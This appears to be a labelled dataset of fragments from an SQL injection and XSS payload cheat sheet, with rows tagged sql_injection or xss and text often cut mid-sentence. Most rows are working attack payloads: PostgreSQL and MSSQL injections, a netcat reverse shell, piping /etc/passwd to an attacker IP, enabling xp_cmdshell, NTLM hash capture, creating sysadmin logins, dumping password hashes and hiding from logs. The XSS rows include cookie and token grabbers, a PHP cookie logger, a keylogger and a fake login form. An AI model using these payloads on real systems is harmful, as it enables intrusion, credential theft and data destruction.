select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1
",sql_injection
"sql
AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR'
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))
AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
",sql_injection
"sql
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
",sql_injection
"

## PostgreSQL Stacked Query

Use a semi-colon """,sql_injection
""" to add another query

",sql_injection
"sql
SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--
",sql_injection
"sql
    select pg_ls_dir('./');
    select pg_read_file('PG_VERSION', 0, 200);
    ",sql_injection
"sql
    CREATE TABLE temp(t TEXT);
    COPY temp FROM '/etc/passwd';
    SELECT * FROM temp limit 1 offset 0;
    ",sql_injection
"sql
    SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID
    SELECT lo_get(16420); -- use the OID returned from the above
    SELECT * from pg_largeobject; -- or just get all the large objects and their data
    ",sql_injection
"sql
    CREATE TABLE nc (t TEXT);
    INSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');
    SELECT * FROM nc;
    COPY nc(t) TO '/tmp/nc.sh';
    ",sql_injection
"sql
    COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';
    ",sql_injection
"sql
    SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data
    SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20
    SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport
    ",sql_injection
"

## PostgreSQL Command Execution

### Using COPY TO/FROM PROGRAM

Installations running Postgres 9.3 and above have functionality which allows for the superuser and users with '",sql_injection
' to pipe to and from an external program using ,sql_injection
"sql
COPY (SELECT '') TO PROGRAM 'getent hosts $(whoami).[BURP_COLLABORATOR_DOMAIN_CALLBACK]';
COPY (SELECT '') to PROGRAM 'nslookup [BURP_COLLABORATOR_DOMAIN_CALLBACK]'
",sql_injection
"sql
CREATE TABLE shell(output text);
COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f';
",sql_injection
"sql
CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
",sql_injection
"

## PostgreSQL WAF Bypass

### Alternative to Quotes

| Payload            | Technique |
| ------------------ | --------- |
| ",sql_injection
 | String from ,sql_injection
" | Dollar-sign ( >= version 8 PostgreSQL)   |

## PostgreSQL Privileges

### PostgreSQL List Privileges

Retrieve all table-level privileges for the current user, excluding tables in system schemas like ",sql_injection
"sql
SELECT * FROM information_schema.role_table_grants WHERE grantee = current_user AND table_schema NOT IN ('pg_catalog', 'information_schema');
",sql_injection
"sql
SHOW is_superuser; 
SELECT current_setting('is_superuser');
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
",sql_injection
SELECT name FROM master..sysdatabases;,sql_injection
SELECT name FROM master.sys.databases;,sql_injection
"-- for N = 0, 1, 2, …",sql_injection
SELECT DB_NAME(N);,sql_injection
"-- Change delimiter value such as ', ' to anything else you want => master, tempdb, model, msdb",sql_injection
-- (Only works in MSSQL 2017+),sql_injection
"SELECT STRING_AGG(name, ', ') FROM master..sysdatabases;",sql_injection
-- use xtype = 'V' for views,sql_injection
SELECT name FROM master..sysobjects WHERE xtype = 'U';,sql_injection
SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U',sql_injection
SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';,sql_injection
-- list column names and types for master..sometable,sql_injection
"SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';",sql_injection
"SELECT table_catalog, table_name FROM information_schema.columns",sql_injection
SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>',sql_injection
"-- Change delimiter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)",sql_injection
"SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U';",sql_injection
-- for the current DB only,sql_injection
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable');,sql_injection
"SELECT table_catalog, column_name FROM information_schema.columns",sql_injection
"SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)",sql_injection
$ SELECT name FROM master..sysdatabases,sql_injection
[*] Injection,sql_injection
[*] msdb,sql_injection
[*] tempdb,sql_injection
* Extract tables from Injection database,sql_injection
$ SELECT name FROM Injection..sysobjects WHERE xtype = 'U',sql_injection
[*] Profiles,sql_injection
[*] Roles,sql_injection
[*] Users,sql_injection
* Extract columns for the table Users,sql_injection
$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users'),sql_injection
[*] UserId,sql_injection
[*] UserName,sql_injection
* Finally extract the data,sql_injection
"SELECT  UserId, UserName from Users",sql_injection
"| CONVERT      | `AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -` |",sql_injection
| IN           | `AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- -` |,sql_injection
"| EQUAL        | `AND 1337=CONCAT('~',(SELECT @@version),'~') -- -` |",sql_injection
| CAST         | `CAST((SELECT @@version) AS INT)` |,sql_injection
* For integer inputs,sql_injection
"convert(int,@@version)",sql_injection
cast((SELECT @@version) as int),sql_injection
* For string inputs,sql_injection
"' + convert(int,@@version) + '",sql_injection
' + cast((SELECT @@version) as int) + ',sql_injection
| Function    | Example                                         |,sql_injection
| ----------- | ----------------------------------------------- |,sql_injection
"| `SUBSTRING` | `SUBSTRING('foobar', <START>, <LENGTH>)`        |",sql_injection
Examples:,sql_injection
"In a time-based blind SQL injection attack, an attacker injects a payload that uses `WAITFOR DELAY` to make the database pause for a certain period. The attacker then observes the response time to infer whether the injected payload executed successfully or not.",sql_injection
* Stacked query without any statement terminator,sql_injection
-- multiple SELECT statements,sql_injection
SELECT 'A'SELECT 'B'SELECT 'C',sql_injection
-- updating password with a stacked query,sql_injection
"SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--",sql_injection
-- using the stacked query to enable xp_cmdshell,sql_injection
"-- you won't have the output of the query, redirect it to a file",sql_injection
"SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--",sql_injection
"* Use a semi-colon ""`;`"" to add another query",sql_injection
ProductID=1; DROP members--,sql_injection
**Permissions**: The `BULK` option requires the `ADMINISTER BULK OPERATIONS` or the `ADMINISTER DATABASE BULK OPERATIONS` permission.,sql_injection
Example:,sql_injection
`xp_cmdshell` is a system stored procedure in Microsoft SQL Server that allows you to run operating system commands directly from within T-SQL (Transact-SQL).,sql_injection
"If you need to reactivate `xp_cmdshell`, it is disabled by default in SQL Server 2005.",sql_injection
> Executed by a different user than the one using `xp_cmdshell` to execute commands,sql_injection
Technique from [@ptswarm](https://twitter.com/ptswarm/status/1313476695295512578/photo/1),sql_injection
* **Permission**: Requires `VIEW SERVER STATE` permission on the server.,sql_injection
```powershell,sql_injection
"1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))",sql_injection
* **Permission**: Requires the `CONTROL SERVER` permission.,sql_injection
"1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default)))",sql_injection
"1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))",sql_injection
MSSQL supports stacked queries so we can create a variable pointing to our IP address then use the `xp_dirtree` function to list the files in our SMB share and grab the NTLMv2 hash.,sql_injection
A trusted link in Microsoft SQL Server is a linked server relationship that allows one SQL Server instance to execute queries and even remote procedures on another server (or external OLE DB source) as if the remote server were part of the local environment. Linked servers expose options that control whether remote procedures and RPC calls are allowed and what security context is used on the remote server.,sql_injection
> The links between databases work even across forest trusts.,sql_injection
* Find links using `sysservers`: contains one row for each server that an instance of SQL Server can access as an OLE DB data source.,sql_injection
select * from master..sysservers,sql_injection
* Execute query through the link,sql_injection
"select * from openquery(""dcorp-sql1"", 'select * from master..sysservers')",sql_injection
"select version from openquery(""linkedserver"", 'select @@version as version')",sql_injection
-- Chain multiple openquery,sql_injection
"select version from openquery(""link1"",'select version from openquery(""link2"",""select @@version as version"")')",sql_injection
* Execute shell commands,sql_injection
"-- Enable xp_cmdshell and execute ""dir"" command",sql_injection
"EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer",sql_injection
"select 1 from openquery(""linkedserver"",'select 1;exec master..xp_cmdshell ""dir c:""')",sql_injection
-- Create a SQL user and give sysadmin privileges,sql_injection
"EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT ""DOMAIN\SERVER1""') AT ""DOMAIN\SERVER2""",sql_injection
"EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT ""DOMAIN\SERVER1""') AT ""DOMAIN\SERVER2""",sql_injection
* Listing effective permissions of current user on the server.,sql_injection
"SELECT * FROM fn_my_permissions(NULL, 'SERVER');",sql_injection
* Listing effective permissions of current user on the database.,sql_injection
"SELECT * FROM fn_my_permissions (NULL, 'DATABASE');",sql_injection
* Listing effective permissions of current user on a view.,sql_injection
"SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name;",sql_injection
* Check if current user is a member of the specified server role.,sql_injection
"-- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin",sql_injection
SELECT is_srvrolemember('sysadmin');,sql_injection
* **MSSQL 2000**: Hashcat mode 131: `0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578`,sql_injection
"SELECT name, password FROM master..sysxlogins",sql_injection
"SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins",sql_injection
-- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer,sql_injection
* **MSSQL 2005**: Hashcat mode 132: `0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe`,sql_injection
"SELECT name, password_hash FROM master.sys.sql_logins",sql_injection
SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins,sql_injection
Use `SP_PASSWORD` in a query to hide from the logs like : `' AND 1=1--sp_password`,sql_injection
SELECT SERVERPROPERTY('productversion'),sql_injection
SELECT SERVERPROPERTY('productlevel'),sql_injection
SELECT SERVERPROPERTY('edition'),sql_injection
SELECT user_name();,sql_injection
SELECT system_user;,sql_injection
"sql
SELECT name FROM master..sysdatabases;
SELECT name FROM master.sys.databases;

-- for N = 0, 1, 2, …
SELECT DB_NAME(N); 

-- Change delimiter value such as ', ' to anything else you want => master, tempdb, model, msdb 
-- (Only works in MSSQL 2017+)
SELECT STRING_AGG(name, ', ') FROM master..sysdatabases; 
",sql_injection
"sql
-- use xtype = 'V' for views
SELECT name FROM master..sysobjects WHERE xtype = 'U';
SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U'
SELECT name FROM someotherdb..sysobjects WHERE xtype = 'U';

-- list column names and types for master..sometable
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable';

SELECT table_catalog, table_name FROM information_schema.columns
SELECT table_name FROM information_schema.tables WHERE table_catalog='<DBNAME>'

-- Change delimiter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)
SELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U';
",sql_injection
"sql
-- for the current DB only
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'mytable');

-- list column names and types for master..sometable
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; 

SELECT table_catalog, column_name FROM information_schema.columns

SELECT COL_NAME(OBJECT_ID('<DBNAME>.<TABLE_NAME>'), <INDEX>)
",sql_injection
"sql
    $ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'
    [*] Profiles
    [*] Roles
    [*] Users
    ",sql_injection
"sql
    $ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')
    [*] UserId
    [*] UserName
    ",sql_injection
"

## MSSQL Error Based

| Name         | Payload         |
| ------------ | --------------- |
| CONVERT      | ",sql_injection
" |
| IN           | ",sql_injection
" |
| EQUAL        | ",sql_injection
" |
| CAST         | ",sql_injection
" |

* For integer inputs

    ",sql_injection
"sql
    ' + convert(int,@@version) + '
    ' + cast((SELECT @@version) as int) + '
    ",sql_injection
"sql
AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -
",sql_injection
"sql
SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'
WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)
SELECT message FROM data WHERE row = 1 and message like 't%'
",sql_injection
"

### MSSQL Blind With Substring Equivalent

| Function    | Example                                         |
| ----------- | ----------------------------------------------- |
| ",sql_injection
"        |

Examples:

",sql_injection
"sql
AND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97
AND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- 
AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'
AND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90
",sql_injection
"sql
ProductID=1;waitfor delay '0:0:10'--
ProductID=1);waitfor delay '0:0:10'--
ProductID=1';waitfor delay '0:0:10'--
ProductID=1');waitfor delay '0:0:10'--
ProductID=1));waitfor delay '0:0:10'--
",sql_injection
"sql
IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'
IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
",sql_injection
"sql
    -- multiple SELECT statements
    SELECT 'A'SELECT 'B'SELECT 'C'

    -- updating password with a stacked query
    SELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--

    -- using the stacked query to enable xp_cmdshell
    -- you won't have the output of the query, redirect it to a file 
    SELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
    ",sql_injection
"

* Use a semi-colon """,sql_injection
""" to add another query

    ",sql_injection
"sql
    ProductID=1; DROP members--
    ",sql_injection
"sql
OPENROWSET(BULK 'C:\path\to\file', SINGLE_CLOB)
",sql_injection
"sql
-1 union select null,(select x from OpenRowset(BULK 'C:\Windows\win.ini',SINGLE_CLOB) R(x)),null,null
",sql_injection
"sql
execute spWriteStringToFile 'contents', 'C:\path\to\', 'file'
",sql_injection
"sql
EXEC xp_cmdshell ""net user"";
EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';
EXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';
",sql_injection
"sql
-- Enable advanced options
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
",sql_injection
"

### Python Script

> Executed by a different user than the one using ",sql_injection
"powershell
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(""getpass"").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(""os"").system(""whoami""))'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open(""C:\\inetpub\\wwwroot\\web.config"", ""r"").read())'
",sql_injection
"powershell
    1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))
    ",sql_injection
"powershell
    1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default)))
    1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))
    ",sql_injection
"sql
1'; use master; exec xp_dirtree '\\10.10.15.XX\SHARE';-- 
",sql_injection
"sql
xp_dirtree '\\attackerip\file'
xp_fileexist '\\attackerip\file'
BACKUP LOG [TESTING] TO DISK = '\\attackerip\file'
BACKUP DATABASE [TESTING] TO DISK = '\\attackeri\file'
RESTORE LOG [TESTING] FROM DISK = '\\attackerip\file'
RESTORE DATABASE [TESTING] FROM DISK = '\\attackerip\file'
RESTORE HEADERONLY FROM DISK = '\\attackerip\file'
RESTORE FILELISTONLY FROM DISK = '\\attackerip\file'
RESTORE LABELONLY FROM DISK = '\\attackerip\file'
RESTORE REWINDONLY FROM DISK = '\\attackerip\file'
RESTORE VERIFYONLY FROM DISK = '\\attackerip\file'
",sql_injection
"

## MSSQL Trusted Links

A trusted link in Microsoft SQL Server is a linked server relationship that allows one SQL Server instance to execute queries and even remote procedures on another server (or external OLE DB source) as if the remote server were part of the local environment. Linked servers expose options that control whether remote procedures and RPC calls are allowed and what security context is used on the remote server.

> The links between databases work even across forest trusts.

* Find links using ",sql_injection
"sql
    select * from openquery(""dcorp-sql1"", 'select * from master..sysservers')
    select version from openquery(""linkedserver"", 'select @@version as version')

    -- Chain multiple openquery
    select version from openquery(""link1"",'select version from openquery(""link2"",""select @@version as version"")')
    ",sql_injection
"sql
    -- Enable xp_cmdshell and execute ""dir"" command
    EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
    select 1 from openquery(""linkedserver"",'select 1;exec master..xp_cmdshell ""dir c:""')

    -- Create a SQL user and give sysadmin privileges
    EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT ""DOMAIN\SERVER1""') AT ""DOMAIN\SERVER2""
    EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT ""DOMAIN\SERVER1""') AT ""DOMAIN\SERVER2""
    ",sql_injection
"sql
    SELECT * FROM fn_my_permissions(NULL, 'SERVER'); 
    ",sql_injection
"sql
    SELECT * FROM fn_my_permissions (NULL, 'DATABASE');
    ",sql_injection
"sql
    SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; 
    ",sql_injection
"sql
    -- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin
    SELECT is_srvrolemember('sysadmin');
    ",sql_injection
"sql
EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;
",sql_injection
"sql
    SELECT name, password FROM master..sysxlogins
    SELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins 
    -- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer
    ",sql_injection
"sql
    SELECT name, password_hash FROM master.sys.sql_logins
    SELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
    ",sql_injection
"sql
-- 'sp_password' was found in the text of this event.
-- The text has been replaced with this comment for security reasons.
",sql_injection
' OR '1'='1,sql_injection
' OR 1=1--,sql_injection
admin' --,sql_injection
admin' #,sql_injection
' UNION SELECT NULL--,sql_injection
1' AND 1=1--,sql_injection
' AND 1=0 UNION ALL SELECT NULL--,sql_injection
' WAITFOR DELAY '00:00:05'--,sql_injection
'; DROP TABLE users--,sql_injection
' OR 'x'='x,sql_injection
1'; exec master..xp_cmdshell 'ping 10.0.0.1'--,sql_injection
' UNION SELECT password FROM users--,sql_injection
admin'/**/OR/**/'1'='1,sql_injection
1' ORDER BY 1--,sql_injection
1' GROUP BY 1--,sql_injection
' OR '1'='1' /*,sql_injection
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>,xss
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>,xss
"<script>new Image().src=""http://localhost/cookie.php?c=""+document.cookie;</script>",xss
"<script>new Image().src=""http://localhost/cookie.php?c=""+localStorage.getItem('access_token');</script>",xss
Leverage the XSS to modify the HTML content of the page in order to display a fake login form.,xss
Another way to collect sensitive data is to set a javascript keylogger.,xss
More exploits at [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all):,xss
- [Taking screenshots using XSS and the HTML5 Canvas](https://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas/),xss
- [JavaScript Port Scanner](http://www.gnucitizen.org/blog/javascript-port-scanner/),xss
- [Network Scanner](http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html),xss
- [.NET Shell execution](http://www.xss-payloads.com/payloads/scripts/dotnetexec.js.html),xss
- [Redirect Form](http://www.xss-payloads.com/payloads/scripts/redirectform.js.html),xss
- [Play Music](http://www.xss-payloads.com/payloads/scripts/playmusic.js.html),xss
This payload opens the debugger in the developer console rather than triggering a popup alert box.,xss
Modern applications with content hosting can use [sandbox domains][sandbox-domains],xss
"> to safely host various types of user-generated content. Many of these sandboxes are specifically meant to isolate user-uploaded HTML, JavaScript, or Flash applets and make sure that they can't access any user data.",xss
[sandbox-domains]:https://security.googleblog.com/2012/08/content-hosting-for-modern-web.html,xss
"For this reason, it's better to use `alert(document.domain)` or `alert(window.origin)` rather than `alert(1)` as default XSS payload in order to know in which scope the XSS is actually executing.",xss
Better payload replacing `<script>alert(1)</script>`:,xss
"While `alert()` is nice for reflected XSS it can quickly become a burden for stored XSS because it requires to close the popup for each execution, so `console.log()` can be used instead to display a message in the console of the developer console (doesn't require any interaction).",xss
Example:,xss
References:,xss
- [Google Bughunter University - XSS in sandbox domains](https://sites.google.com/site/bughunteruniversity/nonvuln/xss-in-sandbox-domain),xss
- [LiveOverflow Video - DO NOT USE alert(1) for XSS](https://www.youtube.com/watch?v=KHwVjzWei1c),xss
- [LiveOverflow blog post - DO NOT USE alert(1) for XSS](https://liveoverflow.com/do-not-use-alert-1-in-xss/),xss
Most tools are also suitable for blind XSS attacks:,xss
- [XSSStrike](https://github.com/s0md3v/XSStrike): Very popular but unfortunately not very well maintained,xss
- [xsser](https://github.com/epsylon/xsser): Utilizes a headless browser to detect XSS vulnerabilities,xss
- [Dalfox](https://github.com/hahwul/dalfox): Extensive functionality and extremely fast thanks to the implementation in Go,xss
- [XSpear](https://github.com/hahwul/XSpear): Similar to Dalfox but based on Ruby,xss
- [domdig](https://github.com/fcavallarin/domdig): Headless Chrome XSS Tester,xss
in newer browsers : firefox-130/chrome-108,xss
Based on a DOM XSS sink.,xss
only IE,xss
**NOTE:** The XML CDATA section is used here so that the JavaScript payload will not be treated as XML markup.,xss
Simple script. Codename: green triangle,xss
"More comprehensive payload with svg tag attribute, desc script, foreignObject script, foreignObject iframe, title script, animatetransform event and simple script. Codename: red ligthning. Author: noraj.",xss
Including a remote SVG image in a SVG works but won't trigger the XSS embedded in the remote SVG. Author: noraj.,xss
SVG 1.x (xlink:href),xss
Including a remote SVG fragment in a SVG works but won't trigger the XSS embedded in the remote SVG element because it's impossible to add vulnerable attribute on a polygon/rect/etc since the `style` attribute is no longer a vector on modern browsers. Author: noraj.,xss
"However, including svg tags in SVG documents works and allows XSS execution from sub-SVGs. Codename: french flag. Author: noraj.",xss
> If the target origin is asterisk * the message can be sent to any domain has reference to the child page.,xss
"> XSS Hunter allows you to find all kinds of cross-site scripting vulnerabilities, including the often-missed blind XSS. The service works by hosting specialized XSS probes which, upon firing, scan the page and send information about the vulnerable page to the XSS Hunter service.",xss
"XSS Hunter is deprecated, it was available at [https://xsshunter.com/app](https://xsshunter.com/app).",xss
You can set up an alternative version,xss
- Self-hosted version from [mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express),xss
- Hosted on [xsshunter.trufflesecurity.com](https://xsshunter.trufflesecurity.com/),xss
- [Netflix-Skunkworks/sleepy-puppy](https://github.com/Netflix-Skunkworks/sleepy-puppy) - Sleepy Puppy XSS Payload Management Framework,xss
- [LewisArdern/bXSS](https://github.com/LewisArdern/bXSS) - bXSS is a utility which can be used by bug hunters and organizations to identify Blind Cross-Site Scripting.,xss
- [ssl/ezXSS](https://github.com/ssl/ezXSS) - ezXSS is an easy way for penetration testers and bug bounty hunters to test (blind) Cross Site Scripting.,xss
- Contact forms,xss
- Ticket support,xss
- Referer Header,xss
- Custom Site Analytics,xss
- Administrative Panel logs,xss
- User Agent,xss
- Comment Box,xss
- Administrative Panel,xss
You can use a [data grabber for XSS](#data-grabber) and a one-line HTTP server to confirm the existence of a blind XSS before deploying a heavy blind-XSS testing tool.,xss
Eg. payload,xss
Eg. one-line HTTP server:,xss
Use browsers quirks to recreate some HTML tags.,xss
"**Example**: Mutated XSS from Masato Kinugawa, used against [cure53/DOMPurify](https://github.com/cure53/DOMPurify) component on Google Search.",xss
"html
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src=""http://localhost/cookie.php?c=""+document.cookie;</script>
<script>new Image().src=""http://localhost/cookie.php?c=""+localStorage.getItem('access_token');</script>
",xss
"php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie.""\r\n"");
fclose($fp);
?>
",xss
"html
<script>
  fetch('https://<SESSION>.burpcollaborator.net', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
",xss
"html
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = ""</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>""
</script>
",xss
"javascript
<img src=x onerror='document.onkeypress=function(e){fetch(""http://domain.com?k=""+String.fromCharCode(e.which))},this.remove();'>
",xss
"javascript
<script>debugger;</script>
",xss
"

Modern applications with content hosting can use [sandbox domains][sandbox-domains]

> to safely host various types of user-generated content. Many of these sandboxes are specifically meant to isolate user-uploaded HTML, JavaScript, or Flash applets and make sure that they can't access any user data.

[sandbox-domains]:https://security.googleblog.com/2012/08/content-hosting-for-modern-web.html

For this reason, it's better to use ",xss
"html
<script>alert(document.domain.concat(""\n"").concat(window.origin))</script>
",xss
" can be used instead to display a message in the console of the developer console (doesn't require any interaction).

Example:

",xss
"html
<script>console.log(""Test XSS from the search bar of page XYZ\n"".concat(document.domain).concat(""\n"").concat(window.origin))</script>
",xss
"javascript
// Basic payload
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
""><script>alert('XSS')</script>
""><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt(""confirm"",30) == 8680439 && 8680439..toString(30) == ""confirm""
<object/data=""jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;"">

// Img payload
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
""><img src=x onerror=alert('XSS');>
""><img src=x onerror=alert(String.fromCharCode(88,83,83));>
<><img src=1 onerror=alert(1)>

// Svg payload
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
""><svg/onload=alert(String.fromCharCode(88,83,83))>
""><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(",xss
" is the only browser which allows self closing script)
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;

// Div payload
<div onpointerover=""alert(45)"">MOVE HERE</div>
<div onpointerdown=""alert(45)"">MOVE HERE</div>
<div onpointerenter=""alert(45)"">MOVE HERE</div>
<div onpointerleave=""alert(45)"">MOVE HERE</div>
<div onpointermove=""alert(45)"">MOVE HERE</div>
<div onpointerout=""alert(45)"">MOVE HERE</div>
<div onpointerup=""alert(45)"">MOVE HERE</div>
",xss
"javascript
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror=""javascript:alert(1)"">
<video src=_ onloadstart=""alert(1)"">
<details/open/ontoggle=""alert",xss
""">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
